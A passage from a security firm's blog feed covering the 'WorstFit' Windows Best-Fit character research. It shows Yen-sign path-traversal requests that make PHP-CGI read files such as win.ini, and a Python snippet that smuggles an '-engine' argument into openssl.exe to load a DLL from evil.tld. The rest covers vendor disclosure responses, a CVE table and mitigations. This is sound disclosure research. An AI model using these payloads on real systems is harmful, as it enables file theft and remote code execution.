&lt;p&gt;By crafting a URL like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi.pl/%E0dmin&lt;/code&gt;, an attacker can bypass the Nginx rule, as the server interprets it as a different path, but Perl‚Äôs CGI script retrieves the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; environment variable with ANSI API, and processes it as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin&lt;/code&gt; after the Best-Fit conversion.&lt;/p&gt;

&lt;h4 id=&quot;-case-study-2---php-cgi-local-file-inclusion-lfi&quot;&gt;‚û§ Case study 2 - PHP-CGI Local File Inclusion (LFI)&lt;/h4&gt;

&lt;p&gt;The previous example was hypothetical, but here‚Äôs a real-world case we discovered. In &lt;strong&gt;PHP-CGI on Windows&lt;/strong&gt;, we identified a file existence check oracle and even a potential LFI (Local File Inclusion) vulnerability under certain configurations.&lt;/p&gt;

&lt;p&gt;The root cause lies in how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; ‚Äî and other path-related environment variables ‚Äî are handled. Let‚Äôs break it down:&lt;/p&gt;

&lt;p&gt;Imagine a request URI like this:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://victim.tld/index.php/foo/bar&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;After the web server (e.g., IIS, Apache, or another PHP-CGI-compatible server) processes it, it generates several environment variables. Depending on the server, these might look like this in Apache:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;REDIRECT_URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
&lt;span class=&quot;nv&quot;&gt;REQUEST_URI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
&lt;span class=&quot;nv&quot;&gt;PATH_INFO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
&lt;span class=&quot;nv&quot;&gt;PATH_TRANSLATED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netpub&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;wwroot&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;ndex.php&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;oo&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notice how the PHP script filename (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;) and the additional path (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo/bar&lt;/code&gt;) are combined. From the environment variables alone, it‚Äôs unclear which part represents the PHP file and which is additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt;. Resolving this ambiguity is left to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt;. Hmm, it must be quite easy to make &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi&lt;/code&gt; confused right?&lt;/p&gt;

&lt;p&gt;The first thought might be to try something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://victim.tld/index.php/../../../secret.txt&lt;/code&gt;. But this apparently won‚Äôt work, as the web server normalizes and validates paths before passing them to PHP-CGI. So, how can we bypass this?&lt;/p&gt;

&lt;p&gt;As we knew in the &lt;strong&gt;Filename Smuggling&lt;/strong&gt; section, the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¬•&lt;/code&gt;) in the Japanese code page can be exploited. For example, by sending a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¬•..¬•windows/win.ini/foo&lt;/code&gt;, you can potentially access arbitrary files. Here‚Äôs how it works:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Web Server‚Äôs Perspective&lt;/strong&gt;: The server treats the entire &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/..¬•..¬•windows/win.ini/foo&lt;/code&gt; as additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; and processes it as part of the request.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;PHP-CGI‚Äôs Perspective&lt;/strong&gt;: PHP-CGI receives things like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;REQUEST_URI=/index.php/..\..\windows/win.ini/foo&lt;/code&gt; and struggles to differentiate between the actual PHP file (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;) and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; portion. This confusion allows the exploit to manipulate the behavior and access files beyond intended restrictions.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This mismatch between how components interpret the request opens the door to potential vulnerabilities. Depending on the web server‚Äôs behavior and configuration, this can turn into a file existence oracle on &lt;strong&gt;Apache&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Non-existing file&lt;/strong&gt;: For a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¬•..¬•NONEXIST/&lt;/code&gt;, PHP-CGI treats &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/..¬•..¬•NONEXIST/&lt;/code&gt; as additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; and renders &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php&lt;/code&gt; as usual.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Existing file&lt;/strong&gt;: For a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¬•..¬•windows/win.ini/&lt;/code&gt;, PHP-CGI fails and produces a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;No input file specified&lt;/code&gt; error due to how it handles valid files internally.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;But why stop at just checking file existence? On an &lt;strong&gt;IIS server&lt;/strong&gt; with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doc_root&lt;/code&gt; directive configured, this can lead to &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt;. Using a path like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¬•..¬•..¬•windows/win.ini/&lt;/code&gt;, you can effectively include and read arbitrary files, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\win.ini&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As an LFI vulnerability, this can surely escalate to a potential &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; in scenarios where the included file contains executable or user-controllable code.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: This specific scenario is rare in real-world applications, so we classify it more as a bug rather than a vulnerability.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-duskor-dawnof-the-worstfit&quot;&gt;The Dusk‚Äìor Dawn‚Äìof the WorstFit&lt;/h2&gt;

&lt;p&gt;As mentioned earlier, we have identified several issues across programming languages, open-source projects, and Windows built-in command-line programs. As responsible researchers, we promptly reported these issues to their respective upstream maintainers. However, this process was quite challenging, the most debated topic is revolved around the &lt;strong&gt;Argument Splitting&lt;/strong&gt;, and this section highlights some obstacles we encountered during the reporting process.&lt;/p&gt;

&lt;h4 id=&quot;-is-this-an-issue&quot;&gt;üßê &lt;strong&gt;Is this an issue?&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;This was the most common question raised by vendors. Those in opposition argued that ‚Äúpassing user inputs to the command line in itself is already a vulnerability‚Äù. Even they are properly escaped or have sanitization in place, the root of the problem is still that ‚Äúdevelopers should avoid such practices altogether‚Äù.&lt;/p&gt;

&lt;p&gt;I am not sure if it‚Äôs fair to shift all the responsibility onto developers. Firstly, the operating system itself is already a scenario that highly requires user inputs. Additionally, with the increasing complexity of web applications, it is really difficult to completely eliminate user input.&lt;/p&gt;

&lt;h4 id=&quot;-who-is-responsible-for-that&quot;&gt;üßê &lt;strong&gt;Who is responsible for that?&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Even if we both agree that this is an issue, the next much challenging question is: ‚ÄúWho is responsible for it?‚Äù Since the problematic code are embedded automatically during compilation (the compiler attaches the entry &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mainCRTStartup()&lt;/code&gt;, which calls the ANSI API within MSVCRT/UCRT), the responsibility becomes unclear. Is it because &lt;strong&gt;‚Äúthe developer failed to use the correct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmain()&lt;/code&gt;‚Äù&lt;/strong&gt;, or is it &lt;strong&gt;‚ÄúCRT‚Äôs failure for not splitting the command line well and pass the wrong argument to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;‚Äù&lt;/strong&gt;?&lt;/p&gt;

&lt;p&gt;To make things even more confusing, some projects only provide source code, leaving the prebuilt executable files distributed to be handled by third-party volunteers across the Internet. In such cases, who should be held accountable for the issue? Taking it a step further, could this even be considered a case of &lt;a href=&quot;https://en.wikipedia.org/wiki/Backdoor_(computing)#Compiler_backdoors&quot;&gt;compiler-introduced security vulnerabilities&lt;/a&gt;? üòâ&lt;/p&gt;

&lt;h4 id=&quot;-its-really-hard-to-fix-it&quot;&gt;üòñ &lt;strong&gt;It‚Äôs really hard to fix it!&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;I believe most maintainers would be willing to help with a quick fix, even if it wasn‚Äôt categorized as a security issue. However, resolving this problem isn‚Äôt that as simple as just replacing the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;&lt;/strong&gt; with its wide-character counterpart. Since the function signature has been changed, maintainers would need to rewrite all variable definitions and argument parsing logics, converting everything from simple &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *&lt;/code&gt;&lt;/strong&gt; to &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wchar_t *&lt;/code&gt;&lt;/strong&gt;. This process can be painful and error-prone. üòµ‚Äçüí´&lt;/p&gt;

&lt;p&gt;We have also summarized some responses we received as follows:&lt;/p&gt;

&lt;h4 id=&quot;-curl&quot;&gt;‚û§ Curl&lt;/h4&gt;

&lt;p&gt;Curl said that this is a Windows feature and there are no plans to fix it. Interestingly, Microsoft‚Äôs &lt;a href=&quot;https://curl.se/windows/microsoft.html&quot;&gt;ported Curl&lt;/a&gt; has properly modified the entry to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmain()&lt;/code&gt; on the contrary, so the built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl.exe&lt;/code&gt; on Windows is not impacted, only the binaries delivered by official  Curl are affected by the Argument Splitting attack.&lt;/p&gt;

&lt;p&gt;Here are some responses from Curl. You can check the full report on &lt;a href=&quot;https://hackerone.com/reports/2550951&quot;&gt;HackerOne&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I‚Äôm struggling to see how this is a curl problem. It looks like a Windows ‚Äúfeature‚Äù to me. It is being ‚Äúhelpful‚Äù and helps users to convert ascii-looking double quotes to ASCII double quotes.&lt;/p&gt;

  &lt;p&gt;‚Äî üë§ Author of Curl&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;If we can mitigate this we should probably consider that, but it is a hard problem and it certainly is not going to be solved in the short term. curl is a victim here, not the responsible party.&lt;/p&gt;

  &lt;p&gt;‚Äî üë§ Author of Curl&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;-openssl&quot;&gt;‚û§ OpenSSL&lt;/h4&gt;

&lt;p&gt;This is an interesting case. OpenSSL provides an environment variable, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPENSSL_WIN32_UTF8&lt;/code&gt;, to handle arguments in Wide Character format. Although its original purpose was to correct issues with displaying UTF-8 in the UI, it also mitigates the Argument Splitting attack unintentionally!&lt;/p&gt;

&lt;p&gt;However, most developers are still unaware of the need to set this environment variable while using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl.exe&lt;/code&gt; executable. As a result,it is still possible to leverage the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-engine&lt;/code&gt; argument to execute arbitrary code in a default OpenSSL usage.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;passphrase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pass&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-engine&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02\\\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;evil.tld&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;malicious.dll&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&apos;openssl.exe&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;enc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-aes-256-cbc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-in&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;in.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-out&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;out.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
    &lt;span class=&quot;s&quot;&gt;&quot;-k&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphrase&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;-perl&quot;&gt;‚û§ Perl&lt;/h4&gt;

&lt;p&gt;The official Perl did not provide prebuilt executables for Windows. Instead, third-party installers such as &lt;a href=&quot;https://strawberryperl.com/&quot;&gt;Strawberry Perl&lt;/a&gt; or &lt;a href=&quot;https://www.activestate.com/products/perl/&quot;&gt;ActiveState Perl&lt;/a&gt; are commonly used, and both of which are affected by the Argument Splitting attack. After having a discuss with the Perl maintainer, they concluded that &lt;strong&gt;‚ÄúThis seems more like a Microsoft bug than a Perl bug,‚Äù&lt;/strong&gt; so this issue remains unresolved in Perl for now.&lt;/p&gt;

&lt;h4 id=&quot;-microsoft&quot;&gt;‚û§ Microsoft&lt;/h4&gt;

&lt;p&gt;We reported three cases to MSRC in total, but the communication process did not go well. All cases were initially rejected for not meeting their severity criteria. We re-opened the case several times and the Excel case was eventually accepted after our third attempt, while the other cases remain unresolved for today :(&lt;/p&gt;

&lt;p&gt;Here is the reply:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The attack scenario here depends on a vulnerability in an unrelated application. The trick inherently requires a separate application that inserts untrusted input into a command line which is then executed. That in itself is a vulnerability; however, the technique which makes exploiting the issue possible does not qualify as a vulnerability.
‚Äî üë§ MSRC&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;-report-to-certcc&quot;&gt;‚û§ Report to CERT/CC&lt;/h4&gt;

&lt;p&gt;Since this is a systemic problem, we have also sought assistance from CERT/CC, hoping to coordinate and collaborate in an effort to find a better solution to address this issue. Microsoft eventually added one more &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea#security-remarks&quot;&gt;warning&lt;/a&gt; in their documentation after several months of effort. However, they only put this warning in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;. There are still several ANSI APIs that need attention! ¬Ø\_(„ÉÑ)_/¬Ø&lt;/p&gt;

&lt;p&gt;During the process of the vulnerability disclosure, we also investigated the open-source ecosystem to identify more affected applications, and tried to report them to their maintainers. Here is a list of what we have reported so far:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Report Date&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Vendor&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Status&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/05/07&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PHP - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv&quot;&gt;CVE-2024-4577&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/13&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Curl - &lt;a href=&quot;https://curl.se/windows/&quot;&gt;Official Build&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://hackerone.com/reports/2550951&quot;&gt;Won‚Äôt Fix&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/16&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft Tar - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Won‚Äôt Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft Excel - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;excel.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026&quot;&gt;CVE-2024-49026&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft PhoneBook - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rasphone.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Won‚Äôt Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;GNU Wget&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No Reply&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/13&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache Subversion - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svn.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CVE-2024-45720&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/05&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;PostgreSQL - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psql.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Won‚Äôt Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/08&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Putty - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plink.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fixed&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/07/15&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Perforce - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p4.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;CVE-2024-8067&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Oracle Java - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Pending Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/06/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Perl - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Won‚Äôt Fix&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OpenSSL - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Other&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/08/19&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;wkhtmltopdf - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wkhtmltopdf.exe&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;EOL&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;

&lt;p&gt;So far, we have summarized attacks on WorstFit, including &lt;strong&gt;Filename Smuggling&lt;/strong&gt;, &lt;strong&gt;Argument Splitting&lt;/strong&gt;, and &lt;strong&gt;Environment Variable Confusion&lt;/strong&gt;. Each attack has its applicable Code Pages. You can check the following table to see if you are at risk or not.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;‚Üì Table of Affected Code Pages:&lt;/em&gt;
&lt;img src=&quot;/assets/img/blog/20250109/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;‚Üì World Map of WorstFit:&lt;/em&gt;
&lt;img src=&quot;/assets/img/blog/20250109/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;mitigations&quot;&gt;Mitigations&lt;/h3&gt;

&lt;p&gt;As for how to mitigate such attacks, unfortunately, since this is an operating system-level problem, similar issues will continue to reappear ‚Äî until Microsoft chooses to enable UTF-8 by default in all of their Windows editions. Before that, the only thing we can do is to encourage everyone, the users, organizations, and developers, to gradually phase out ANSI and promote the use of the Wide Character API, transiting the environment to a safer world step by step!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As a user&lt;/strong&gt;, the only thing you can do is to check the UTF-8 option on your Windows. However, since this feature is still in the BETA phase, it‚Äôs uncertain whether it will cause side effects or not.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As a developer&lt;/strong&gt;, please use the Wide Character API as much as possible. As well as the C Runtime Library, they also provide the wide character versions, such as &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetcwd&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetenv&lt;/code&gt;&lt;/a&gt;. Otherwise, the implementation of the underlying implementation still call the ANSI API, which is vulnerable to our WorstFit attacks, too!&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;We hope this article provides you with an overview and enough insights to understand WorstFit Attack. Of course, this is not the end. Considering Windows‚Äô commitment towards backward compatibility, you can imagine there are more hidden places the ANSI API would appear, for example, the Windows Registry queries like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegQueryValueA&lt;/code&gt; are definitely affected but need to find a vulnerable scenario, and we also observed Best-Fit behavior in Active Directory! üòâ&lt;/p&gt;

&lt;p&gt;We encourage more researchers to explore this attack surface and look forward to see more vulnerabilities in the future!&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi/</link>
                <guid>https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi</guid>
                <pubDate>Thu, 09 Jan 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2025 Á¨¨‰∏ÉÂ±ÜÂØ¶ÁøíÁîüË®àÁï´</title>
                <description>&lt;p&gt;DEVCORE ÂâµÁ´ãËøÑ‰ªäÂ∑≤ÈÄæÂçÅÂπ¥ÔºåÊåÅÁ∫åÂ∞àÊ≥®ÊñºÊèê‰æõ‰∏ªÂãïÂºèË≥áÂÆâÊúçÂãôÔºå‰∏¶Ëá¥ÂäõÂ∞ãÊâæÂêÑÁ®ÆÂÆâÂÖ®È¢®Èö™ÂèäÊºèÊ¥ûÔºåËÆì‰∏ñÁïåËÆäÂæóÊõ¥ÂÆâÂÖ®„ÄÇÁÇ∫‰∫ÜÊåÅÁ∫åÂ∞ãÊâæÊõ¥Â§öÊìÅÊúâÁõ∏ÂêåÁêÜÂøµÁöÑË≥áÂÆâÊñ∞Èä≥„ÄÅÂçîÂä©Â≠∏ÁîüÂª∫ÊßãÊ≠£Á¢∫Ë≥áÂÆâÊÑèË≠òÂèäÊäÄËÉΩÔºåÊàëÂÄëÊàêÁ´ã‰∫Ü„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÔºå‰∫¶Êñº 2022 Âπ¥ÂàùËàâËæ¶È¶ñÂ±ÜÂØ¶ÁøíÁîüË®àÁï´ÔºåÁõÆÂâçÁÇ∫Ê≠¢ÊàêÊûúÈ†óË±ê„ÄÅË∂Ö‰πéÈ†êÊúü„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂæàÊ¶ÆÂπ∏Âú∞ÂÆ£‰ΩàÔºåÁ¨¨‰∏ÉÂ±ÜÂØ¶ÁøíÁîüË®àÁï´Â∞áÊñº 2025 ‰∏âÊúàÁôªÂ†¥ÔºåÂç≥Êó•Ëµ∑Ê≠£ÂºèÈñãÊîæÂ†±ÂêçÔºÅÁÇ∫‰∫ÜËÆìÂêåÂ≠∏ÂÄëÊúâÊõ¥ÂÖÖË£ïÁöÑÊ∫ñÂÇôÊôÇÈñì‰∏¶Áç≤ÂæóÊõ¥Â•ΩÁöÑÂØ¶ÁøíÈ´îÈ©óÔºåÊú¨Â±ÜÂú®ÊôÇÁ®ã‰∏äÂÅö‰∫Ü‰∏Ä‰∫õË™øÊï¥Ôºö&lt;/p&gt;
&lt;ul&gt;
